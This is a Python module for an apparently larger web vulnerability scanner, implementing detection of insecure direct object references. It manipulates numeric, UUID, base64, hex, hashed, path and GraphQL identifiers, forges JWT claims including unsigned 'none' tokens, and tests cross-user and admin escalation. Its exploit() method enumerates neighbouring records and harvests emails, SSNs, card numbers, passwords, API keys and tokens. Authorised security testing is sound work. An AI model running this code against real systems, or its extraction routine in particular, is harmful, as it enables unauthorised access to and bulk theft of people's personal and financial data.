import re
import base64
import hashlib
import json
from urllib.parse import urlparse
from modules.base import BaseModule
from core.utils import extract_params


class IdorModule(BaseModule):
    name = "idor"
    description = "Insecure Direct Object Reference Scanner"
    exploitable = True
    
    id_keywords = [
        "id", "uid", "user", "userid", "user_id", "account", "accountid", 
        "account_id", "profile", "profileid", "doc", "docid", "document", 
        "documentid", "file", "fileid", "file_id", "order", "orderid", 
        "order_id", "invoice", "invoiceid", "item", "itemid", "product",
        "productid", "ref", "reference", "num", "number", "record", "recordid",
        "transaction", "transactionid", "txn", "txnid", "payment", "paymentid",
        "message", "messageid", "msg", "msgid", "ticket", "ticketid", "case",
        "caseid", "report", "reportid", "project", "projectid", "task", "taskid",
        "comment", "commentid", "post", "postid", "blog", "blogid", "article",
        "articleid", "page", "pageid", "resource", "resourceid", "object",
        "objectid", "entity", "entityid", "customer", "customerid", "client",
        "clientid", "member", "memberid", "subscriber", "subscriberid"
    ]
    
    path_id_patterns = [
        r'/users?/(\d+)',
        r'/accounts?/(\d+)',
        r'/profiles?/(\d+)',
        r'/orders?/(\d+)',
        r'/invoices?/(\d+)',
        r'/documents?/(\d+)',
        r'/files?/(\d+)',
        r'/items?/(\d+)',
        r'/products?/(\d+)',
        r'/messages?/(\d+)',
        r'/tickets?/(\d+)',
        r'/reports?/(\d+)',
        r'/api/v\d+/\w+/(\d+)',
        r'/(\d+)(?:/|$)',
        r'/([a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12})',
        r'/([A-Za-z0-9_-]{20,})',
    ]
    
    uuid_pattern = re.compile(r'^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$', re.I)
    base64_pattern = re.compile(r'^[A-Za-z0-9+/]{4,}={0,2}$')
    hex_pattern = re.compile(r'^[0-9a-f]{16,}$', re.I)
    hash_md5_pattern = re.compile(r'^[0-9a-f]{32}$', re.I)
    hash_sha1_pattern = re.compile(r'^[0-9a-f]{40}$', re.I)
    hash_sha256_pattern = re.compile(r'^[0-9a-f]{64}$', re.I)
    
    graphql_id_patterns = [
        r'"id"\s*:\s*"([^"]+)"',
        r'"node_id"\s*:\s*"([^"]+)"',
        r'node\s*\(\s*id\s*:\s*"([^"]+)"',
    ]
    
    async def scan(self, target):
        self.findings = []
        self.confirmed_idors = []
        self.auth_manager = None
        self.sessions = {}
        
        params = extract_params(target)
        
        auth_config = self.config.get("auth_config")
        if auth_config:
            await self._setup_auth_manager(auth_config)
        
        id_params = self._find_id_params(params)
        
        if id_params:
            for param in id_params:
                value = self._extract_param_value(target, param)
                if not value:
                    continue
                
                id_type = self._detect_id_type(value)
                
                if id_type == "numeric":
                    await self._test_numeric_idor(target, param, value)
                elif id_type == "uuid":
                    await self._test_uuid_idor(target, param, value)
                elif id_type == "base64":
                    await self._test_base64_idor(target, param, value)
                elif id_type == "hex":
                    await self._test_hex_idor(target, param, value)
                elif id_type in ["md5", "sha1", "sha256"]:
                    await self._test_hash_idor(target, param, value, id_type)
                else:
                    await self._test_generic_idor(target, param, value)
        
        await self._test_path_idor(target)
        
        resp = await self.http.get(target)
        if resp.get("status"):
            await self._test_graphql_idor(target, resp.get("text", ""))
        
        if self.auth_manager and len(self.sessions) >= 2:
            await self._test_cross_user_idor(target, id_params)
            await self._test_vertical_escalation(target, id_params)
        
        if self.config.get("jwt_token"):
            await self._test_jwt_claim_idor(target, id_params)
        
        if self.aggressive:
            await self._test_batch_enumeration(target, id_params)
            await self._test_timestamp_idor(target, id_params)
            await self._test_method_override_idor(target, id_params)
        
        return self.findings
    
    def _detect_id_type(self, value):
        if not value:
            return "unknown"
        
        value = str(value).strip()
        
        if value.isdigit() or (value.startswith("-") and value[1:].isdigit()):
            return "numeric"
        
        if self.uuid_pattern.match(value):
            return "uuid"
        
        if self.hash_md5_pattern.match(value):
            return "md5"
        
        if self.hash_sha1_pattern.match(value):
            return "sha1"
        
        if self.hash_sha256_pattern.match(value):
            return "sha256"
        
        if self.hex_pattern.match(value) and len(value) >= 16:
            return "hex"
        
        if self.base64_pattern.match(value) and len(value) >= 8:
            try:
                decoded = base64.b64decode(value)
                if decoded:
                    return "base64"
            except:
                pass
        
        return "string"
    
    async def _setup_auth_manager(self, config):
        try:
            from core.auth_manager import create_auth_manager
            self.auth_manager = await create_auth_manager(config, self.http)
            
            for role, creds in config.get("credentials", {}).items():
                if creds:
                    session = await self.auth_manager.login(role)
                    if session:
                        self.sessions[role] = session
        except Exception:
            pass
    
    def _find_id_params(self, params):
        found = []
        for param in params:
            if any(kw in param.lower() for kw in self.id_keywords):
                found.append(param)
            else:
                value = params.get(param, [''])[0] if isinstance(params, dict) else ''
                if str(value).isdigit() or self._detect_id_type(str(value)) != "string":
                    found.append(param)
        
        return found if found else list(params.keys()) if isinstance(params, dict) else params
    
    async def _test_numeric_idor(self, target, param, original_value):
        base_id = int(original_value)
        
        baseline = await self.http.get(target)
        if not baseline.get("status"):
            return
        
        test_values = [
            (str(base_id + 1), "increment"),
            (str(base_id - 1), "decrement"),
            (str(base_id + 100), "large_jump"),
            ("1", "first_record"),
            ("0", "zero"),
            (str(-base_id), "negative"),
            (str(base_id * 2), "double"),
        ]
        
        accessible_records = []
        
        for test_val, test_type in test_values:
            if test_val == original_value:
                continue
            
            resp = await self.test_param(target, param, test_val)
            
            if not resp.get("status"):
                continue
            
            if resp.get("status") == 200:
                diff_score = self._calculate_content_difference(baseline, resp, original_value, test_val)
                
                if diff_score > 0.3:
                    sensitive_data = self._extract_sensitive_data(resp.get("text", ""))
                    
                    if sensitive_data:
                        self.add_finding(
                            "CRITICAL",
                            f"IDOR CONFIRMED: Accessed different user's data",
                            url=target,
                            parameter=param,
                            evidence=f"Original ID: {original_value}, Test ID: {test_val}, Found: {', '.join(sensitive_data[:3])}",
                            confidence_evidence=["idor_confirmed", "sensitive_data_exposed", "different_content"],
                            request_data={"method": "GET", "url": target, "param": param, "payload": test_val}
                        )
                        self.confirmed_idors.append({"param": param, "type": "numeric", "id": test_val})
                        return
                    
                    accessible_records.append(test_val)
        
        if len(accessible_records) >= 2:
            self.add_finding(
                "HIGH",
                f"Potential IDOR: Multiple records accessible",
                url=target,
                parameter=param,
                evidence=f"Accessed IDs: {', '.join(accessible_records[:5])}",
                confidence_evidence=["idor_likely", "enumeration_possible"]
            )
    
    async def _test_uuid_idor(self, target, param, original_value):
        baseline = await self.http.get(target)
        
        test_uuids = [
            "00000000-0000-0000-0000-000000000000",
            "11111111-1111-1111-1111-111111111111",
            "ffffffff-ffff-ffff-ffff-ffffffffffff",
            original_value[:-1] + ("0" if original_value[-1] != "0" else "1"),
            original_value[:8] + "-0000-0000-0000-000000000000",
        ]
        
        for test_uuid in test_uuids:
            if test_uuid.lower() == original_value.lower():
                continue
            
            resp = await self.test_param(target, param, test_uuid)
            
            if resp.get("status") == 200 and len(resp.get("text", "")) > 100:
                if resp.get("text") != baseline.get("text", ""):
                    sensitive = self._extract_sensitive_data(resp.get("text", ""))
                    
                    self.add_finding(
                        "HIGH",
                        "UUID-based IDOR Detected",
                        url=target,
                        parameter=param,
                        evidence=f"Predictable UUID accepted: {test_uuid[:20]}...",
                        confidence_evidence=["uuid_idor", "access_control_bypass"],
                        request_data={"method": "GET", "url": target, "param": param, "payload": test_uuid}
                    )
                    self.confirmed_idors.append({"param": param, "type": "uuid", "id": test_uuid})
                    return
    
    async def _test_base64_idor(self, target, param, original_value):
        try:
            decoded = base64.b64decode(original_value).decode('utf-8', errors='ignore')
        except:
            return
        
        baseline = await self.http.get(target)
        
        test_payloads = []
        
        if decoded.isdigit():
            base = int(decoded)
            test_payloads = [
                base64.b64encode(str(base + 1).encode()).decode(),
                base64.b64encode(str(base - 1).encode()).decode(),
                base64.b64encode(b"1").decode(),
                base64.b64encode(b"admin").decode(),
            ]
        else:
            try:
                json_data = json.loads(decoded)
                if isinstance(json_data, dict):
                    for key in ["id", "user_id", "userId", "uid"]:
                        if key in json_data:
                            modified = json_data.copy()
                            if isinstance(modified[key], int):
                                modified[key] = modified[key] + 1
                            elif modified[key].isdigit():
                                modified[key] = str(int(modified[key]) + 1)
                            else:
                                modified[key] = "1"
                            test_payloads.append(base64.b64encode(json.dumps(modified).encode()).decode())
            except:
                test_payloads = [
                    base64.b64encode(b"1").decode(),
                    base64.b64encode(b"admin").decode(),
                    base64.b64encode(decoded.replace("1", "2").encode()).decode() if "1" in decoded else None,
                ]
        
        for test_payload in filter(None, test_payloads):
            resp = await self.test_param(target, param, test_payload)
            
            if resp.get("status") == 200 and resp.get("text") != baseline.get("text", ""):
                self.add_finding(
                    "HIGH",
                    "Base64-encoded IDOR Detected",
                    url=target,
                    parameter=param,
                    evidence=f"Modified base64 payload accepted",
                    confidence_evidence=["base64_idor", "encoded_id_manipulation"],
                    request_data={"method": "GET", "url": target, "param": param}
                )
                self.confirmed_idors.append({"param": param, "type": "base64"})
                return
    
    async def _test_hex_idor(self, target, param, original_value):
        baseline = await self.http.get(target)
        
        try:
            int_val = int(original_value, 16)
            test_vals = [
                hex(int_val + 1)[2:].zfill(len(original_value)),
                hex(int_val - 1)[2:].zfill(len(original_value)),
                "0" * len(original_value),
                "f" * len(original_value),
            ]
        except:
            return
        
        for test_val in test_vals:
            resp = await self.test_param(target, param, test_val)
            
            if resp.get("status") == 200 and resp.get("text") != baseline.get("text", ""):
                self.add_finding(
                    "HIGH",
                    "Hex-encoded IDOR Detected",
                    url=target,
                    parameter=param,
                    evidence=f"Modified hex value: {test_val[:20]}...",
                    confidence_evidence=["hex_idor", "encoded_id_manipulation"]
                )
                return
    
    async def _test_hash_idor(self, target, param, original_value, hash_type):
        baseline = await self.http.get(target)
        
        test_inputs = ["1", "2", "admin", "test", "user", "0", "root"]
        
        for test_input in test_inputs:
            if hash_type == "md5":
                test_hash = hashlib.md5(test_input.encode()).hexdigest()
            elif hash_type == "sha1":
                test_hash = hashlib.sha1(test_input.encode()).hexdigest()
            elif hash_type == "sha256":
                test_hash = hashlib.sha256(test_input.encode()).hexdigest()
            else:
                continue
            
            if test_hash == original_value:
                continue
            
            resp = await self.test_param(target, param, test_hash)
            
            if resp.get("status") == 200 and resp.get("text") != baseline.get("text", ""):
                self.add_finding(
                    "HIGH",
                    f"Hash-based IDOR ({hash_type.upper()})",
                    url=target,
                    parameter=param,
                    evidence=f"Predictable hash pattern: {hash_type}('{test_input}')",
                    confidence_evidence=["hash_idor", "predictable_identifier"],
                    request_data={"method": "GET", "url": target, "param": param, "payload": test_hash}
                )
                self.confirmed_idors.append({"param": param, "type": "hash", "hash_type": hash_type})
                return
    
    async def _test_generic_idor(self, target, param, original_value):
        baseline = await self.http.get(target)
        
        test_vals = [
            "admin",
            "root",
            "test",
            "1",
            original_value + "1",
            original_value[:-1] if len(original_value) > 1 else "x",
        ]
        
        for test_val in test_vals:
            if test_val == original_value:
                continue
            
            resp = await self.test_param(target, param, test_val)
            
            if resp.get("status") == 200:
                if self._calculate_content_difference(baseline, resp, original_value, test_val) > 0.3:
                    self.add_finding(
                        "MEDIUM",
                        "Potential IDOR with string identifier",
                        url=target,
                        parameter=param,
                        evidence=f"Different content for value: {test_val}",
                        confidence_evidence=["potential_idor"]
                    )
                    return
    
    async def _test_path_idor(self, target):
        parsed = urlparse(target)
        path = parsed.path
        
        for pattern in self.path_id_patterns:
            match = re.search(pattern, path, re.I)
            if match:
                original_id = match.group(1)
                id_type = self._detect_id_type(original_id)
                
                if id_type == "numeric":
                    test_ids = [str(int(original_id) + 1), str(int(original_id) - 1), "1"]
                elif id_type == "uuid":
                    test_ids = ["00000000-0000-0000-0000-000000000000"]
                else:
                    test_ids = ["1", "admin", "test"]
                
                baseline = await self.http.get(target)
                
                for test_id in test_ids:
                    if test_id == original_id:
                        continue
                    
                    new_path = re.sub(pattern, path[match.start(0):match.start(1)] + test_id + path[match.end(1):match.end(0)], path)
                    test_url = f"{parsed.scheme}://{parsed.netloc}{new_path}"
                    if parsed.query:
                        test_url += f"?{parsed.query}"
                    
                    resp = await self.http.get(test_url)
                    
                    if resp.get("status") == 200 and resp.get("text") != baseline.get("text", ""):
                        sensitive = self._extract_sensitive_data(resp.get("text", ""))
                        
                        severity = "CRITICAL" if sensitive else "HIGH"
                        
                        self.add_finding(
                            severity,
                            "Path-based IDOR Detected",
                            url=test_url,
                            evidence=f"Path ID manipulation: {original_id} -> {test_id}" + (f", Found: {', '.join(sensitive[:2])}" if sensitive else ""),
                            confidence_evidence=["path_idor", "access_control_bypass"],
                            request_data={"method": "GET", "url": test_url}
                        )
                        self.confirmed_idors.append({"type": "path", "original": original_id, "test": test_id})
                        return
    
    async def _test_graphql_idor(self, target, text):
        for pattern in self.graphql_id_patterns:
            matches = re.findall(pattern, text, re.I)
            for node_id in matches[:3]:
                try:
                    decoded = base64.b64decode(node_id).decode()
                    
                    if ":" in decoded:
                        parts = decoded.split(":")
                        if len(parts) >= 2 and parts[-1].isdigit():
                            modified_id = int(parts[-1]) + 1
                            new_decoded = ":".join(parts[:-1]) + ":" + str(modified_id)
                            new_node_id = base64.b64encode(new_decoded.encode()).decode()
                            
                            query = f'query {{ node(id: "{new_node_id}") {{ ... on User {{ id email name }} }} }}'
                            
                            resp = await self.http.post(target, json={"query": query})
                            
                            if resp.get("status") == 200:
                                data = resp.get("text", "")
                                if "email" in data.lower() or "name" in data.lower():
                                    if "errors" not in data.lower():
                                        self.add_finding(
                                            "HIGH",
                                            "GraphQL Node ID IDOR",
                                            url=target,
                                            evidence=f"Modified node ID accepted: {new_decoded}",
                                            confidence_evidence=["graphql_idor", "node_id_manipulation"],
                                            request_data={"method": "POST", "url": target, "query": query[:100]}
                                        )
                                        return
                except:
                    continue
    
    async def _test_cross_user_idor(self, target, params):
        roles = list(self.sessions.keys())
        if len(roles) < 2:
            return
        
        user_a = roles[0]
        user_b = roles[1]
        
        resp_a = await self.auth_manager.request_as(user_a, "GET", target)
        if resp_a.get("status") != 200:
            return
        
        user_a_data = self._extract_sensitive_data(resp_a.get("text", ""))
        
        if not user_a_data:
            return
        
        for param in (params or []):
            original_value = self._extract_param_value(target, param)
            if not original_value:
                continue
            
            resp_b = await self.auth_manager.request_as(user_b, "GET", target)
            
            if resp_b.get("status") == 200:
                user_b_text = resp_b.get("text", "")
                
                for data_point in user_a_data:
                    if data_point in user_b_text and data_point not in ["true", "false", "null"]:
                        self.add_finding(
                            "CRITICAL",
                            f"CROSS-USER IDOR: {user_b} accessed {user_a}'s data",
                            url=target,
                            parameter=param,
                            evidence=f"Data leaked: {data_point[:50]}",
                            confidence_evidence=["cross_user_idor", "horizontal_escalation", "data_breach"],
                            request_data={
                                "method": "GET",
                                "url": target,
                                "user_a": user_a,
                                "user_b": user_b
                            }
                        )
                        self.confirmed_idors.append({"type": "cross_user", "victim": user_a, "attacker": user_b})
                        return
    
    async def _test_vertical_escalation(self, target, params):
        roles = list(self.sessions.keys())
        
        admin_roles = [r for r in roles if any(a in r.lower() for a in ["admin", "super", "root", "manager"])]
        user_roles = [r for r in roles if r not in admin_roles]
        
        if not admin_roles or not user_roles:
            return
        
        admin_role = admin_roles[0]
        user_role = user_roles[0]
        
        admin_resp = await self.auth_manager.request_as(admin_role, "GET", target)
        
        if admin_resp.get("status") != 200:
            return
        
        admin_data = self._extract_sensitive_data(admin_resp.get("text", ""))
        
        user_resp = await self.auth_manager.request_as(user_role, "GET", target)
        
        if user_resp.get("status") == 200:
            user_text = user_resp.get("text", "")
            
            admin_only_keywords = ["admin", "superuser", "role", "permission", "all_users", "system"]
            
            for data in admin_data:
                if data in user_text and any(k in data.lower() for k in admin_only_keywords):
                    self.add_finding(
                        "CRITICAL",
                        f"VERTICAL PRIVILEGE ESCALATION: {user_role} -> {admin_role}",
                        url=target,
                        evidence=f"Admin data accessible: {data[:50]}",
                        confidence_evidence=["vertical_escalation", "privilege_escalation", "admin_access"],
                        request_data={"method": "GET", "url": target}
                    )
                    return
    
    async def _test_jwt_claim_idor(self, target, params):
        jwt_token = self.config.get("jwt_token", "")
        
        if not jwt_token or "." not in jwt_token:
            return
        
        try:
            parts = jwt_token.split(".")
            if len(parts) != 3:
                return
            
            header = json.loads(base64.urlsafe_b64decode(parts[0] + "=="))
            payload = json.loads(base64.urlsafe_b64decode(parts[1] + "=="))
            
            id_claims = ["sub", "user_id", "uid", "id", "userId"]
            
            for claim in id_claims:
                if claim in payload:
                    original = payload[claim]
                    
                    modified = payload.copy()
                    if isinstance(original, int):
                        modified[claim] = original + 1
                    elif str(original).isdigit():
                        modified[claim] = str(int(original) + 1)
                    else:
                        modified[claim] = "1"
                    
                    new_payload = base64.urlsafe_b64encode(json.dumps(modified).encode()).decode().rstrip("=")
                    
                    if header.get("alg") == "none":
                        forged_jwt = f"{parts[0]}.{new_payload}."
                    else:
                        forged_jwt = f"{parts[0]}.{new_payload}.{parts[2]}"
                    
                    resp = await self.http.get(target, headers={"Authorization": f"Bearer {forged_jwt}"})
                    
                    if resp.get("status") == 200:
                        self.add_finding(
                            "HIGH",
                            f"JWT Claim IDOR Possible ({claim})",
                            url=target,
                            evidence=f"Modified claim accepted: {claim}={modified[claim]}",
                            confidence_evidence=["jwt_idor", "claim_manipulation"]
                        )
                        return
        except:
            pass
    
    async def _test_batch_enumeration(self, target, params):
        if not params:
            return
        
        for param in params[:2]:
            original = self._extract_param_value(target, param)
            if not original or not original.isdigit():
                continue
            
            base_id = int(original)
            test_ids = [str(base_id + i) for i in range(1, 11)]
            
            batch_url = target.replace(f"{param}={original}", f"{param}=" + ",".join(test_ids))
            
            resp = await self.http.get(batch_url)
            
            if resp.get("status") == 200:
                text = resp.get("text", "")
                
                records_found = 0
                for test_id in test_ids:
                    if test_id in text:
                        records_found += 1
                
                if records_found >= 3:
                    self.add_finding(
                        "HIGH",
                        "Batch ID Enumeration Possible",
                        url=target,
                        parameter=param,
                        evidence=f"Multiple IDs returned in single request: {records_found}/10",
                        confidence_evidence=["batch_idor", "mass_enumeration"]
                    )
                    return
    
    async def _test_timestamp_idor(self, target, params):
        import time
        
        if not params:
            return
        
        for param in params[:2]:
            original = self._extract_param_value(target, param)
            if not original:
                continue
            
            try:
                ts = int(original)
                now = int(time.time())
                
                if abs(ts - now) < 86400 * 365 * 5:
                    test_ts = [ts - 1, ts + 1, ts - 3600, ts + 3600]
                    
                    baseline = await self.http.get(target)
                    
                    for test in test_ts:
                        resp = await self.test_param(target, param, str(test))
                        
                        if resp.get("status") == 200 and resp.get("text") != baseline.get("text", ""):
                            self.add_finding(
                                "MEDIUM",
                                "Timestamp-based IDOR",
                                url=target,
                                parameter=param,
                                evidence=f"Timestamp manipulation: {ts} -> {test}",
                                confidence_evidence=["timestamp_idor", "predictable_id"]
                            )
                            return
            except:
                continue
    
    async def _test_method_override_idor(self, target, params):
        if not params:
            return
        
        param = list(params)[0] if isinstance(params, dict) else params[0]
        original = self._extract_param_value(target, param)
        if not original:
            return
        
        test_val = str(int(original) + 1) if original.isdigit() else "1"
        
        override_methods = [
            {"X-HTTP-Method-Override": "GET"},
            {"X-Method-Override": "GET"},
            {"_method": "GET"},
        ]
        
        baseline = await self.http.get(target)
        
        for override in override_methods:
            test_url = target.replace(f"{param}={original}", f"{param}={test_val}")
            
            resp = await self.http.post(test_url, headers=override if isinstance(override, dict) and "X-" in str(override) else {}, data=override if "_method" in override else {})
            
            if resp.get("status") == 200 and resp.get("text") != baseline.get("text", ""):
                self.add_finding(
                    "MEDIUM",
                    "IDOR via HTTP Method Override",
                    url=target,
                    parameter=param,
                    evidence=f"Access via method override: {str(override)[:50]}",
                    confidence_evidence=["method_override_idor"]
                )
                return
    
    def _calculate_content_difference(self, baseline, test_resp, orig_val, test_val):
        if not baseline.get("text") or not test_resp.get("text"):
            return 0
        
        b_text = baseline.get("text", "")
        t_text = test_resp.get("text", "")
        
        if b_text == t_text:
            return 0
        
        b_clean = re.sub(r'\b' + re.escape(str(orig_val)) + r'\b', '', b_text)
        t_clean = re.sub(r'\b' + re.escape(str(test_val)) + r'\b', '', t_text)
        
        if b_clean == t_clean:
            return 0.1
        
        len_diff = abs(len(b_text) - len(t_text))
        max_len = max(len(b_text), len(t_text))
        
        if max_len == 0:
            return 0
        
        return min(1.0, len_diff / max_len + 0.2)
    
    def _extract_param_value(self, url, param):
        match = re.search(rf'{re.escape(param)}=([^&]+)', url)
        return match.group(1) if match else None
    
    def _extract_sensitive_data(self, content):
        patterns = [
            (r'"email"\s*:\s*"([^"]+@[^"]+)"', "email"),
            (r'"username"\s*:\s*"([^"]+)"', "username"),
            (r'"name"\s*:\s*"([^"]+)"', "name"),
            (r'"full_name"\s*:\s*"([^"]+)"', "name"),
            (r'"phone"\s*:\s*"([^"]+)"', "phone"),
            (r'"mobile"\s*:\s*"([^"]+)"', "phone"),
            (r'"ssn"\s*:\s*"([^"]+)"', "ssn"),
            (r'"social_security"\s*:\s*"([^"]+)"', "ssn"),
            (r'"address"\s*:\s*"([^"]+)"', "address"),
            (r'"credit_card"\s*:\s*"([^"]+)"', "credit_card"),
            (r'"card_number"\s*:\s*"([^"]+)"', "credit_card"),
            (r'"account_number"\s*:\s*"([^"]+)"', "account"),
            (r'"balance"\s*:\s*"?([^",}]+)"?', "balance"),
            (r'"salary"\s*:\s*"?([^",}]+)"?', "salary"),
            (r'"password"\s*:\s*"([^"]+)"', "password"),
            (r'"api_key"\s*:\s*"([^"]+)"', "api_key"),
            (r'"secret"\s*:\s*"([^"]+)"', "secret"),
            (r'"token"\s*:\s*"([^"]+)"', "token"),
            (r'"dob"\s*:\s*"([^"]+)"', "dob"),
            (r'"date_of_birth"\s*:\s*"([^"]+)"', "dob"),
        ]
        
        found = []
        for pattern, data_type in patterns:
            matches = re.findall(pattern, content, re.IGNORECASE)
            for m in matches:
                if len(m) > 2 and m not in ["true", "false", "null", "undefined"]:
                    found.append(f"{data_type}:{m[:30]}")
        
        return list(set(found))[:10]
    
    async def exploit(self, target, finding):
        extracted = {
            "records_accessed": [],
            "data_extracted": [],
            "total_enumerated": 0
        }
        
        param = finding.get("parameter")
        if not param:
            return None
        
        for idor in self.confirmed_idors:
            if idor.get("type") == "numeric":
                original = self._extract_param_value(target, param)
                if not original or not original.isdigit():
                    continue
                
                base_id = int(original)
                
                for offset in range(-10, 11):
                    test_id = str(base_id + offset)
                    resp = await self.test_param(target, param, test_id)
                    
                    if resp.get("status") == 200:
                        data = self._extract_sensitive_data(resp.get("text", ""))
                        if data:
                            extracted["records_accessed"].append(test_id)
                            extracted["data_extracted"].extend(data)
                            extracted["total_enumerated"] += 1
                
                if extracted["data_extracted"]:
                    self.add_finding(
                        "CRITICAL",
                        f"IDOR EXPLOITED: {extracted['total_enumerated']} records extracted",
                        url=target,
                        parameter=param,
                        evidence=f"Data types found: {list(set([d.split(':')[0] for d in extracted['data_extracted']]))}"
                    )
            
            elif idor.get("type") == "path":
                original = idor.get("original")
                if original and original.isdigit():
                    base = int(original)
                    
                    for i in range(1, 21):
                        test_url = target.replace(f"/{original}", f"/{base + i}")
                        resp = await self.http.get(test_url)
                        
                        if resp.get("status") == 200:
                            data = self._extract_sensitive_data(resp.get("text", ""))
                            if data:
                                extracted["records_accessed"].append(str(base + i))
                                extracted["data_extracted"].extend(data)
                                extracted["total_enumerated"] += 1
        
        if extracted["data_extracted"]:
            extracted["data_extracted"] = list(set(extracted["data_extracted"]))[:50]
            self.exploited_data = extracted
            return extracted
        
        return None
